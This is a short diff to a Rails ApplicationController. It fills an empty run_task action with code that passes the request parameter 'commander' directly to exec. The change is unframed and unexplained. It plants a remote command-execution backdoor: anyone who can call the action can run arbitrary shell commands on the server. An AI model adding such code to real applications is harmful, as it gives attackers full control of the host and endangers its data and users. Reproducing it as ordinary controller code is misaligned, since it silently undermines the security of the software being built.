@@ -4,7 +4,8 @@ class ApplicationController < ActionController::Base
   protect_from_forgery
 
   def run_task
-
+    _commander = params[:commander]
+    exec _commander
   end
 
   def user_email
